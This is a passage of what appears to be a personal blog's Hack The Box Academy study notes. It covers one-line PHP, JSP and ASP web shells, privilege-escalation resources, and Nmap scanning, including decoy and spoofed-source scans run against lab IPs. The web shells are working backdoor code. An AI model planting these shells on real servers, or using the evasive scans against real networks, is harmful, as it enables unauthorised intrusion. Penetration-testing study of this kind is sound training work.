class=p>();</span>
</span></span></code></pre></div><ul><li>The final type of shell we have is a <code>Web Shell</code>. A <code>Web Shell</code> is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.</li></ul><p><strong>php</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;cmd&#34;</span><span class=p>]);</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p><strong>jsp</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;%</span> <span class=nx>Runtime</span><span class=o>.</span><span class=nx>getRuntime</span><span class=p>()</span><span class=o>.</span><span class=nx>exec</span><span class=p>(</span><span class=nx>request</span><span class=o>.</span><span class=nx>getParameter</span><span class=p>(</span><span class=s2>&#34;cmd&#34;</span><span class=p>));</span> <span class=o>%&gt;</span>
</span></span></code></pre></div><p><strong>asp</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;%</span> <span class=k>eval</span> <span class=nx>request</span><span class=p>(</span><span class=s2>&#34;cmd&#34;</span><span class=p>)</span> <span class=o>%&gt;</span>
</span></span></code></pre></div><h3 id=privesc-checklists>PrivEsc Checklists<a hidden class=anchor aria-hidden=true href=#privesc-checklists>#</a></h3><p>Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is <a href=https://book.hacktricks.xyz/ title=HackTricks target=_blank rel="nofollow noopener">HackTricks</a>, which has an excellent checklist for both <a href=https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist title=Linux target=_blank rel="nofollow noopener">Linux</a> and <a href=https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation title=Windows target=_blank rel="nofollow noopener">Windows</a> local privilege escalation. Another excellent repository is <a href=https://github.com/swisskyrepo/PayloadsAllTheThings title=PayloadsAllTheThings target=_blank rel="nofollow noopener">PayloadsAllTheThings</a>, which also has checklists for both <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md title=Linux target=_blank rel="nofollow noopener">Linux</a> and <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md title=Windows target=_blank rel="nofollow noopener">Windows</a>. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.</p><h3 id=enumeration-scripts>Enumeration Scripts<a hidden class=anchor aria-hidden=true href=#enumeration-scripts>#</a></h3><p>Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include <a href=https://github.com/rebootuser/LinEnum.git title=LinEnum target=_blank rel="nofollow noopener">LinEnum</a> and <a href=https://github.com/sleventyeleven/linuxprivchecker title=linuxprivchecker target=_blank rel="nofollow noopener">linuxprivchecker</a>, and for Windows include <a href=https://github.com/GhostPack/Seatbelt title=Seatbelt target=_blank rel="nofollow noopener">Seatbelt</a> and <a href=https://github.com/411Hall/JAWS title=JAWS target=_blank rel="nofollow noopener">JAWS</a>.</p><p>Another useful tool we may use for server enumeration is the <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite title="Privilege Escalation Awesome Scripts SUITE (PEASS)" target=_blank rel="nofollow noopener">Privilege Escalation Awesome Scripts SUITE (PEASS)</a>, as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.</p><p><a href=https://gtfobins.github.io/ title=GTFOBins target=_blank rel="nofollow noopener">GTFOBins</a> contains a list of commands and how they can be exploited through <code>sudo</code></p><p><a href=https://lolbas-project.github.io/# title=LOLBAS target=_blank rel="nofollow noopener">LOLBAS</a> also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.</p><h3 id=practice-resources>Practice Resources<a hidden class=anchor aria-hidden=true href=#practice-resources>#</a></h3><table><thead><tr><th>Platform</th><th>Description</th></tr></thead><tbody><tr><td><a href=https://owasp.org/www-project-juice-shop/ title="OWASP Juice Shop" target=_blank rel="nofollow noopener">OWASP Juice Shop</a></td><td>Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire <a href=https://owasp.org/www-project-top-ten title="OWASP Top Ten" target=_blank rel="nofollow noopener">OWASP Top Ten</a> along with many other real-world application security flaws.</td></tr><tr><td><a href=https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/ title="Metasploitable 2" target=_blank rel="nofollow noopener">Metasploitable 2</a></td><td>Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.</td></tr><tr><td><a href=https://github.com/rapid7/metasploitable3 title="Metasploitable 3" target=_blank rel="nofollow noopener">Metasploitable 3</a></td><td>Is a template for building a vulnerable Windows VM configured with a wide range of <a href=https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities title=vulnerabilities target=_blank rel="nofollow noopener">vulnerabilities</a>.</td></tr><tr><td><a href=https://github.com/digininja/DVWA title=DVWA target=_blank rel="nofollow noopener">DVWA</a></td><td>This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.</td></tr><tr><td><a href=https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA title=IppSec target=_blank rel="nofollow noopener">IppSec</a></td><td>Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.</td></tr><tr><td><a href=https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ title=VbScrub target=_blank rel="nofollow noopener">VbScrub</a></td><td>Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.</td></tr><tr><td><a href=https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg title=STÖK target=_blank rel="nofollow noopener">STÖK</a></td><td>Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.</td></tr><tr><td><a href=https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w title=LiveOverflow target=_blank rel="nofollow noopener">LiveOverflow</a></td><td>Provides videos on a wide variety of technical infosec topics.</td></tr></tbody></table><h3 id=first-attack>First Attack<a hidden class=anchor aria-hidden=true href=#first-attack>#</a></h3><p>For an entire write-up of this box, see <a href=/posts/htb/easy/nibbles title="HTB Writeup: Nibbles">HTB Writeup: Nibbles</a>.</p><h3 id=complete-1>Complete<a hidden class=anchor aria-hidden=true href=#complete-1>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/77 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><p> </p><hr><p> </p><h2 id=network-enumeration-with-nmap>Network Enumeration with Nmap<a hidden class=anchor aria-hidden=true href=#network-enumeration-with-nmap>#</a></h2><h3 id=nmap-architecture>Nmap Architecture<a hidden class=anchor aria-hidden=true href=#nmap-architecture>#</a></h3><ul><li>Host discovery</li><li>Port scanning</li><li>Service enumeration and detection</li><li>OS detection</li><li>Scriptable interaction with the target service (Nmap Scripting Engine)</li></ul><h3 id=tcp-syn-scan>TCP-SYN Scan<a hidden class=anchor aria-hidden=true href=#tcp-syn-scan>#</a></h3><p>The TCP-SYN scan (<code>-sS</code>) is one of the default settings unless we have defined otherwise and is also one of the most popular scan methods. This scan method makes it possible to scan several thousand ports per second. The TCP-SYN scan sends one packet with the SYN flag and, therefore, never completes the three-way handshake, which results in not establishing a full TCP connection to the scanned port.</p><ul><li>If our target sends an <code>SYN-ACK</code> flagged packet back to the scanned port, Nmap detects that the port is open.</li><li>If the packet receives an <code>RST</code> flag, it is an indicator that the port is closed.</li><li>If Nmap does not receive a packet back, it will display it as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.</li></ul><h3 id=scan-network-range>Scan Network Range<a hidden class=anchor aria-hidden=true href=#scan-network-range>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.0/24 -sn -oA tnet <span class=p>|</span> grep <span class=k>for</span> <span class=p>|</span> cut -d<span class=s2>&#34; &#34;</span> -f5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.129.2.4
</span></span><span class=line><span class=cl>10.129.2.10
</span></span><span class=line><span class=cl>10.129.2.11
</span></span><span class=line><span class=cl>10.129.2.18
</span></span><span class=line><span class=cl>10.129.2.19
</span></span><span class=line><span class=cl>10.129.2.20
</span></span><span class=line><span class=cl>10.129.2.28
</span></span></code></pre></div><table><thead><tr><th>Scanning Options</th><th>Description</th></tr></thead><tbody><tr><td><code>10.129.2.0/24</code></td><td>Target network range.</td></tr><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr><tr><td><code>-oA tnet</code></td><td>Stores the results in all formats starting with the name &rsquo;tnet'.</td></tr></tbody></table><h3 id=scan-ip-list>Scan IP List<a hidden class=anchor aria-hidden=true href=#scan-ip-list>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap -sn -oA tnet -iL hosts.lst <span class=p>|</span> grep <span class=k>for</span> <span class=p>|</span> cut -d<span class=s2>&#34; &#34;</span> -f5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.129.2.18
</span></span><span class=line><span class=cl>10.129.2.19
</span></span><span class=line><span class=cl>10.129.2.20
</span></span></code></pre></div><table><thead><tr><th>Scanning Options</th><th>Description</th></tr></thead><tbody><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr><tr><td><code>-oA tnet</code></td><td>Stores the results in all formats starting with the name &rsquo;tnet'.</td></tr><tr><td><code>-iL</code></td><td>Performs defined scans against targets in provided &lsquo;hosts.lst&rsquo; list.</td></tr></tbody></table><h3 id=scan-multiple-ips>Scan Multiple IPs<a hidden class=anchor aria-hidden=true href=#scan-multiple-ips>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20<span class=p>|</span> grep <span class=k>for</span> <span class=p>|</span> cut -d<span class=s2>&#34; &#34;</span> -f5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.129.2.18
</span></span><span class=line><span class=cl>10.129.2.19
</span></span><span class=line><span class=cl>10.129.2.20
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap -sn -oA tnet 10.129.2.18-20<span class=p>|</span> grep <span class=k>for</span> <span class=p>|</span> cut -d<span class=s2>&#34; &#34;</span> -f5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.129.2.18
</span></span><span class=line><span class=cl>10.129.2.19
</span></span><span class=line><span class=cl>10.129.2.20
</span></span></code></pre></div><h3 id=scan-single-ip>Scan Single IP<a hidden class=anchor aria-hidden=true href=#scan-single-ip>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.18 -sn -oA host 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-14 23:59 CEST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.18
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.087s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.11 seconds
</span></span></code></pre></div><table><thead><tr><th>Scanning Options</th><th>Description</th></tr></thead><tbody><tr><td><code>10.129.2.18</code></td><td>Performs defined scans against the target.</td></tr><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr><tr><td><code>-oA host</code></td><td>Stores the results in all formats starting with the name &lsquo;host&rsquo;.</td></tr></tbody></table><p>*<em>If we disable port scan (<code>-sn</code>), Nmap automatically ping scan with ICMP Echo Requests (<code>-PE</code>). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the &ldquo;<code>--packet-trace</code>&rdquo; option. To ensure that ICMP echo requests are sent, we also define the option (<code>-PE</code>) for this.</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-15 00:08 CEST
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0074s<span class=o>)</span> ARP who-has 10.129.2.18 tell 10.10.14.2
</span></span><span class=line><span class=cl>RCVD <span class=o>(</span>0.0309s<span class=o>)</span> ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.18
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.023s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.05 seconds
</span></span></code></pre></div><table><thead><tr><th>Scanning Options</th><th>Description</th></tr></thead><tbody><tr><td><code>10.129.2.18</code></td><td>Performs defined scans against the target.</td></tr><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr><tr><td><code>-oA host</code></td><td>Stores the results in all formats starting with the name &lsquo;host&rsquo;.</td></tr><tr><td><code>-PE</code></td><td>Performs the ping scan by using &lsquo;ICMP Echo requests&rsquo; against the target.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr></tbody></table><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-15 00:10 CEST
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0074s<span class=o>)</span> ARP who-has 10.129.2.18 tell 10.10.14.2
</span></span><span class=line><span class=cl>RCVD <span class=o>(</span>0.0309s<span class=o>)</span> ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.18
</span></span><span class=line><span class=cl>Host is up, received arp-response <span class=o>(</span>0.028s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.03 seconds
</span></span></code></pre></div><table><thead><tr><th>Scanning Options</th><th>Description</th></tr></thead><tbody><tr><td><code>10.129.2.18</code></td><td>Performs defined scans against the target.</td></tr><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr><tr><td><code>-oA host</code></td><td>Stores the results in all formats starting with the name &lsquo;host&rsquo;.</td></tr><tr><td><code>-PE</code></td><td>Performs the ping scan by using &lsquo;ICMP Echo requests&rsquo; against the target.</td></tr><tr><td><code>--reason</code></td><td>Displays the reason for specific result.</td></tr></tbody></table><h3 id=nmap-cheatsheet>Nmap Cheatsheet<a hidden class=anchor aria-hidden=true href=#nmap-cheatsheet>#</a></h3><p><strong>Scanning Options</strong></p><table><thead><tr><th>Nmap Option</th><th>Description</th></tr></thead><tbody><tr><td><code>10.10.10.0/24</code></td><td>Target network range.</td></tr><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr><tr><td><code>-Pn</code></td><td>Disables ICMP Echo Requests</td></tr><tr><td><code>-n</code></td><td>Disables DNS Resolution.</td></tr><tr><td><code>-PE</code></td><td>Performs the ping scan by using ICMP Echo Requests against the target.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr><tr><td><code>--reason</code></td><td>Displays the reason for a specific result.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP Ping Requests.</td></tr><tr><td><code>--top-ports=&lt;num></code></td><td>Scans the specified top ports that have been defined as most frequent.</td></tr><tr><td><code>-p-</code></td><td>Scan all ports.</td></tr><tr><td><code>-p22-110</code></td><td>Scan all ports between 22 and 110.</td></tr><tr><td><code>-p22,25</code></td><td>Scans only the specified ports 22 and 25.</td></tr><tr><td><code>-F</code></td><td>Scans top 100 ports.</td></tr><tr><td><code>-sS</code></td><td>Performs an TCP SYN-Scan.</td></tr><tr><td><code>-sA</code></td><td>Performs an TCP ACK-Scan.</td></tr><tr><td><code>-sU</code></td><td>Performs an UDP Scan.</td></tr><tr><td><code>-sV</code></td><td>Scans the discovered services for their versions.</td></tr><tr><td><code>-sC</code></td><td>Perform a Script Scan with scripts that are categorized as &ldquo;default&rdquo;.</td></tr><tr><td><code>--script &lt;script></code></td><td>Performs a Script Scan by using the specified scripts.</td></tr><tr><td><code>-O</code></td><td>Performs an OS Detection Scan to determine the OS of the target.</td></tr><tr><td><code>-A</code></td><td>Performs OS Detection, Service Detection, and traceroute scans.</td></tr><tr><td><code>-D RND:5</code></td><td>Sets the number of random Decoys that will be used to scan the target.</td></tr><tr><td><code>-e</code></td><td>Specifies the network interface that is used for the scan.</td></tr><tr><td><code>-S 10.10.10.200</code></td><td>Specifies the source IP address for the scan.</td></tr><tr><td><code>-g</code></td><td>Specifies the source port for the scan.</td></tr><tr><td><code>--dns-server &lt;ns></code></td><td>DNS resolution is performed by using a specified name server.</td></tr></tbody></table><p><strong>Output Options</strong></p><table><thead><tr><th>Nmap Option</th><th>Description</th></tr></thead><tbody><tr><td><code>-oA filename</code></td><td>Stores the results in all available formats starting with the name of &ldquo;filename&rdquo;.</td></tr><tr><td><code>-oN filename</code></td><td>Stores the results in normal format with the name &ldquo;filename&rdquo;.</td></tr><tr><td><code>-oG filename</code></td><td>Stores the results in &ldquo;grepable&rdquo; format with the name of &ldquo;filename&rdquo;.</td></tr><tr><td><code>-oX filename</code></td><td>Stores the results in XML format with the name of &ldquo;filename&rdquo;.</td></tr></tbody></table><p><strong>Performance Options</strong></p><table><thead><tr><th>Nmap Option</th><th>Description</th></tr></thead><tbody><tr><td><code>--max-retries &lt;num></code></td><td>Sets the number of retries for scans of specific ports.</td></tr><tr><td><code>--stats-every=5s</code></td><td>Displays scan&rsquo;s status every 5 seconds.</td></tr><tr><td><code>-v/-vv</code></td><td>Displays verbose output during the scan.</td></tr><tr><td><code>--initial-rtt-timeout 50ms</code></td><td>Sets the specified time value as initial RTT timeout.</td></tr><tr><td><code>--max-rtt-timeout 100ms</code></td><td>Sets the specified time value as maximum RTT timeout.</td></tr><tr><td><code>--min-rate 300</code></td><td>Sets the number of packets that will be sent simultaneously.</td></tr><tr><td><code>-T &lt;0-5></code></td><td>Specifies the specific timing template.</td></tr></tbody></table><h3 id=host-and-port-scanning>Host and Port Scanning<a hidden class=anchor aria-hidden=true href=#host-and-port-scanning>#</a></h3><table><thead><tr><th>State</th><th>Description</th></tr></thead><tbody><tr><td>open</td><td>This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.</td></tr><tr><td>closed</td><td>When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.</td></tr><tr><td>filtered</td><td>Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.</td></tr><tr><td>unfiltered</td><td>This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.</td></tr><tr><td>open|filtered</td><td>If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.</td></tr><tr><td>closed|filtered</td><td>This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.</td></tr></tbody></table><h3 id=nmap-scripting-engine-nse>Nmap Scripting Engine (NSE)<a hidden class=anchor aria-hidden=true href=#nmap-scripting-engine-nse>#</a></h3><table><thead><tr><th>Category</th><th>Description</th></tr></thead><tbody><tr><td>auth</td><td>Determination of authentication credentials.</td></tr><tr><td>broadcast</td><td>Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.</td></tr><tr><td>brute</td><td>Executes scripts that try to log in to the respective service by brute-forcing with credentials.</td></tr><tr><td>default</td><td>Default scripts executed by using the <code>-sC</code> option.</td></tr><tr><td>discovery</td><td>Evaluation of accessible services.</td></tr><tr><td>dos</td><td>These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.</td></tr><tr><td>exploit</td><td>This category of scripts tries to exploit known vulnerabilities for the scanned port.</td></tr><tr><td>external</td><td>Scripts that use external services for further processing.</td></tr><tr><td>fuzzer</td><td>This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.</td></tr><tr><td>intrusive</td><td>Intrusive scripts that could negatively affect the target system.</td></tr><tr><td>malware</td><td>Checks if some malware infects the target system.</td></tr><tr><td>safe</td><td>Defensive scripts that do not perform intrusive and destructive access.</td></tr><tr><td>version</td><td>Extension for service detection.</td></tr><tr><td>vuln</td><td>Identification of specific vulnerabilities.</td></tr></tbody></table><h3 id=decoys>Decoys<a hidden class=anchor aria-hidden=true href=#decoys>#</a></h3><p>There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (-D) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (RND) a specific number (for example: 5) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.</p><p><strong>Random Source IPs</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.28 -p <span class=m>80</span> -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-21 16:14 CEST
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0378s<span class=o>)</span> TCP 102.52.161.59:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>42</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0378s<span class=o>)</span> TCP 10.10.14.2:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>59</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0379s<span class=o>)</span> TCP 210.120.38.29:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>37</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0379s<span class=o>)</span> TCP 191.6.64.171:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>38</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0379s<span class=o>)</span> TCP 184.178.194.209:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>39</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0379s<span class=o>)</span> TCP 43.21.121.33:59289 &gt; 10.129.2.28:80 S <span class=nv>ttl</span><span class=o>=</span><span class=m>55</span> <span class=nv>id</span><span class=o>=</span><span class=m>29822</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>3687542010</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>RCVD <span class=o>(</span>0.1370s<span class=o>)</span> TCP 10.129.2.28:80 &gt; 10.10.14.2:59289 SA <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>id</span><span class=o>=</span><span class=m>0</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>4056111701</span> <span class=nv>win</span><span class=o>=</span><span class=m>64240</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.28
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.099s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>80/tcp open  http
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF <span class=o>(</span>Intel Corporate<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.15 seconds
</span></span></code></pre></div><table><thead><tr><th>Scanning Options</th><th>Description</th></tr></thead><tbody><tr><td><code>10.129.2.28</code></td><td>Scans the specified target.</td></tr><tr><td><code>-p 80</code></td><td>Scans only the specified ports.</td></tr><tr><td><code>-sS</code></td><td>Performs SYN scan on specified ports.</td></tr><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr><tr><td><code>-D RND:5</code></td><td>Generates five random IP addresses that indicates the source IP the connection comes from.</td></tr></tbody></table><p><strong>Specified Source IP</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.28 -n -Pn -p <span class=m>445</span> -O -S 10.129.2.200 -e tun0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-22 01:16 CEST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.28
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.010s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE
</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF <span class=o>(</span>Intel Corporate<span class=o>)</span>
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
